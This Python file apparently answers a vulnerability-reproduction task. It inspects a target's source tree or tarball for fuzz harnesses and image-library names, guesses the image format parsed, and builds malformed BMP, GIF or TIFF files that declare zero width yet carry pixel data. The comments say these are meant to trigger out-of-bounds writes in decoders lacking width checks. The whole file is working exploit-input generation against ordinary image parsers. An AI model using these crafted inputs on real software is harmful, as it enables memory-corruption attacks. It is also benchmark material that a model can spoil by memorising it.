import os
import io
import re
import tarfile
import struct
import zlib
from typing import Dict, List, Tuple, Optional


def _u16(x: int) -> bytes:
    return struct.pack("<H", x & 0xFFFF)


def _u32(x: int) -> bytes:
    return struct.pack("<I", x & 0xFFFFFFFF)


def _i32(x: int) -> bytes:
    return struct.pack("<i", int(x))


def _be_u32(x: int) -> bytes:
    return struct.pack(">I", x & 0xFFFFFFFF)


def _read_limited_text(data: bytes, limit: int = 200_000) -> str:
    if len(data) > limit:
        data = data[:limit]
    try:
        return data.decode("utf-8", "ignore")
    except Exception:
        try:
            return data.decode("latin-1", "ignore")
        except Exception:
            return ""


def _iter_source_texts_from_tar(src_path: str, max_files: int = 400, max_each: int = 400_000) -> Tuple[List[str], List[str]]:
    names: List[str] = []
    texts: List[str] = []

    def is_text_name(n: str) -> bool:
        n2 = n.lower()
        return any(n2.endswith(ext) for ext in (
            ".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".hxx",
            ".m", ".mm", ".rs", ".go", ".java", ".kt", ".py", ".js", ".ts",
            ".cmake", "cmakelists.txt", ".gn", ".gni", ".mk", "makefile",
            ".txt", ".md", ".rst", ".in", ".yml", ".yaml", ".sh"
        ))

    try:
        with tarfile.open(src_path, "r:*") as tf:
            members = tf.getmembers()
            members.sort(key=lambda m: (0 if "fuzz" in (m.name or "").lower() else 1, m.size))
            count = 0
            for m in members:
                if count >= max_files:
                    break
                if not m.isfile():
                    continue
                n = m.name or ""
                if not n:
                    continue
                names.append(n.lower())
                if not is_text_name(n):
                    continue
                if m.size <= 0 or m.size > max_each:
                    continue
                try:
                    f = tf.extractfile(m)
                    if not f:
                        continue
                    data = f.read(max_each + 1)
                except Exception:
                    continue
                t = _read_limited_text(data, limit=max_each).lower()
                if not t:
                    continue
                if ("llvmfuzzertestoneinput" in t) or ("fuzz" in n.lower()):
                    texts.append(t)
                    count += 1
                else:
                    if len(texts) < 80:
                        texts.append(t)
                        count += 1
    except Exception:
        return [], []

    return names, texts


def _iter_source_texts_from_dir(src_path: str, max_files: int = 400, max_each: int = 400_000) -> Tuple[List[str], List[str]]:
    names: List[str] = []
    texts: List[str] = []

    def is_text_name(n: str) -> bool:
        n2 = n.lower()
        base = os.path.basename(n2)
        return any(n2.endswith(ext) for ext in (
            ".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".hxx",
            ".m", ".mm", ".rs", ".go", ".java", ".kt", ".py", ".js", ".ts",
            ".cmake", ".gn", ".gni", ".mk", ".txt", ".md", ".rst", ".in",
            ".yml", ".yaml", ".sh"
        )) or base in ("cmakelists.txt", "makefile")

    files: List[str] = []
    for root, _, fnames in os.walk(src_path):
        for fn in fnames:
            p = os.path.join(root, fn)
            files.append(p)

    files.sort(key=lambda p: (0 if "fuzz" in p.lower() else 1, os.path.getsize(p) if os.path.isfile(p) else 0))
    for p in files[:max_files * 3]:
        rel = os.path.relpath(p, src_path).replace("\\", "/")
        names.append(rel.lower())
        if len(texts) >= max_files:
            break
        if not is_text_name(rel):
            continue
        try:
            sz = os.path.getsize(p)
        except Exception:
            continue
        if sz <= 0 or sz > max_each:
            continue
        try:
            with open(p, "rb") as f:
                data = f.read(max_each + 1)
        except Exception:
            continue
        t = _read_limited_text(data, limit=max_each).lower()
        if not t:
            continue
        if ("llvmfuzzertestoneinput" in t) or ("fuzz" in rel.lower()):
            texts.append(t)
        else:
            if len(texts) < max_files:
                texts.append(t)

    return names, texts


def _guess_format(src_path: str) -> str:
    fmts = ("bmp", "tiff", "gif", "png", "psd", "ico", "webp", "pnm")
    scores: Dict[str, int] = {k: 0 for k in fmts}

    if os.path.isdir(src_path):
        names, texts = _iter_source_texts_from_dir(src_path)
    else:
        names, texts = _iter_source_texts_from_tar(src_path)

    joined_names = "\n".join(names)

    def add_score_for_substrings(fmt: str, subs: List[str], weight: int, hay: str) -> None:
        h = hay
        for s in subs:
            if s in h:
                scores[fmt] += weight

    # Filename-based signals
    add_score_for_substrings("bmp", ["bmp", "bitmap", "rle8", "rle4"], 5, joined_names)
    add_score_for_substrings("tiff", ["tiff", ".tif", "tif_"], 6, joined_names)
    add_score_for_substrings("gif", ["gif"], 6, joined_names)
    add_score_for_substrings("png", ["png"], 6, joined_names)
    add_score_for_substrings("psd", ["psd"], 6, joined_names)
    add_score_for_substrings("ico", ["ico", "icon"], 6, joined_names)
    add_score_for_substrings("webp", ["webp", "vp8"], 6, joined_names)
    add_score_for_substrings("pnm", ["pnm", "ppm", "pgm", "pbm", "pnm"], 5, joined_names)

    # Content-based signals (fuzzer sources have priority since they show entrypoint)
    for t in texts:
        add_score_for_substrings("tiff", ["tiffio.h", "tiffopen", "tiffread", "tiffclientopen"], 20, t)
        add_score_for_substrings("png", ["png.h", "libpng", "png_read", "png_create_read_struct", "ihdr"], 15, t)
        add_score_for_substrings("gif", ["gif_lib.h", "dgifopen", "egifopen", "gif"], 12, t)
        add_score_for_substrings("bmp", ["bmp", "bitmap", "rle8", "bitmapinfoheader"], 10, t)
        add_score_for_substrings("psd", ["psd", "8bps"], 12, t)
        add_score_for_substrings("ico", ["ico", "icon", "icondir"], 10, t)
        add_score_for_substrings("webp", ["webp", "vp8", "vp8l", "webpdecode"], 12, t)
        add_score_for_substrings("pnm", ["ppm", "pgm", "pbm", "pnm"], 10, t)
        if "stb_image" in t or "stbi_load" in t:
            scores["bmp"] += 8
            scores["gif"] += 4
            scores["png"] += 4

    best = max(fmts, key=lambda k: scores.get(k, 0))
    if scores[best] <= 0:
        return "bmp"
    return best


def _gen_bmp_rle8_zero_width() -> bytes:
    w = 0
    h = 1

    # RLE8 absolute mode: 00 nn [nn bytes] [pad if nn odd]
    abs_count = 64
    abs_data = bytes((i & 0xFF) for i in range(abs_count))
    pixel_data = b"\x00" + bytes([abs_count]) + abs_data + b"\x00\x00" + b"\x00\x01"

    palette = b"".join(bytes([i, i, i, 0]) for i in range(256))
    bfOffBits = 14 + 40 + len(palette)
    bfSize = bfOffBits + len(pixel_data)

    file_header = b"BM" + _u32(bfSize) + _u16(0) + _u16(0) + _u32(bfOffBits)

    biSize = 40
    biPlanes = 1
    biBitCount = 8
    BI_RLE8 = 1
    biSizeImage = len(pixel_data)
    biXPelsPerMeter = 2835
    biYPelsPerMeter = 2835
    biClrUsed = 256
    biClrImportant = 256

    info_header = (
        _u32(biSize) +
        _i32(w) +
        _i32(h) +
        _u16(biPlanes) +
        _u16(biBitCount) +
        _u32(BI_RLE8) +
        _u32(biSizeImage) +
        _i32(biXPelsPerMeter) +
        _i32(biYPelsPerMeter) +
        _u32(biClrUsed) +
        _u32(biClrImportant)
    )

    return file_header + info_header + palette + pixel_data


def _gen_gif_zero_width_image() -> bytes:
    # GIF89a + global color table (2 entries).
    # Image Descriptor: image width = 0, height = 1.
    # LZW stream outputs 1 pixel then EOI. If decoder doesn't check width==0, it may write into a 0-sized buffer.
    header = b"GIF89a"
    lsd_width = 1
    lsd_height = 1
    gct_flag = 1
    color_resolution = 7
    sort_flag = 0
    gct_size = 0  # 2 entries
    packed = (gct_flag << 7) | (color_resolution << 4) | (sort_flag << 3) | gct_size
    lsd = _u16(lsd_width) + _u16(lsd_height) + bytes([packed, 0, 0])
    gct = b"\x00\x00\x00" + b"\xff\xff\xff"

    img_sep = b"\x2c"
    left = 0
    top = 0
    img_w = 0
    img_h = 1
    img_packed = 0
    img_desc = img_sep + _u16(left) + _u16(top) + _u16(img_w) + _u16(img_h) + bytes([img_packed])

    lzw_min_code_size = 2
    # Codes: clear(4), 0, end(5) with 3-bit code size packed LSB-first => bytes 0x44 0x01
    lzw_data = b"\x44\x01"
    sub_blocks = bytes([len(lzw_data)]) + lzw_data + b"\x00"

    trailer = b"\x3b"
    return header + lsd + gct + img_desc + bytes([lzw_min_code_size]) + sub_blocks + trailer


def _gen_tiff_zero_width() -> bytes:
    # Minimal little-endian TIFF with one strip whose byte count is nonzero but width is zero.
    # If width/height aren't validated, some implementations may allocate 0 and still read/copy strip data.
    endian = b"II"
    magic = _u16(42)
    ifd_offset = _u32(8)

    # Build IFD entries
    # Types: 3=SHORT, 4=LONG
    entries: List[bytes] = []

    def ifd_entry(tag: int, typ: int, count: int, value: int) -> bytes:
        return _u16(tag) + _u16(typ) + _u32(count) + _u32(value)

    def ifd_entry_short(tag: int, value: int) -> bytes:
        # Store SHORT in low 16 bits of the value field
        return _u16(tag) + _u16(3) + _u32(1) + _u16(value) + _u16(0)

    width = 0
    height = 1
    strip_bytes = 32

    # We'll place strip data after IFD
    n = 10
    ifd_size = 2 + n * 12 + 4
    strip_offset_val = 8 + ifd_size

    entries.append(ifd_entry(256, 4, 1, width))              # ImageWidth
    entries.append(ifd_entry(257, 4, 1, height))             # ImageLength
    entries.append(ifd_entry_short(258, 8))                  # BitsPerSample
    entries.append(ifd_entry_short(259, 1))                  # Compression (none)
    entries.append(ifd_entry_short(262, 1))                  # PhotometricInterpretation (BlackIsZero)
    entries.append(ifd_entry(273, 4, 1, strip_offset_val))   # StripOffsets
    entries.append(ifd_entry_short(277, 1))                  # SamplesPerPixel
    entries.append(ifd_entry(278, 4, 1, height))             # RowsPerStrip
    entries.append(ifd_entry(279, 4, 1, strip_bytes))        # StripByteCounts
    entries.append(ifd_entry_short(284, 1))                  # PlanarConfiguration

    ifd = _u16(n) + b"".join(entries) + _u32(0)
    strip_data = b"A" * strip_bytes

    return endian + magic + ifd_offset + ifd + strip_data


class Solution:
    def solve(self, src_path: str) -> bytes:
        fmt = _guess_format(src_path)
        if fmt == "tiff":
            return _gen_tiff_zero_width()
        if fmt == "gif":
            return _gen_gif_zero_width_image()
        # BMP as robust default for many image loaders / auto-detect harnesses
        return _gen_bmp_rle8_zero_width()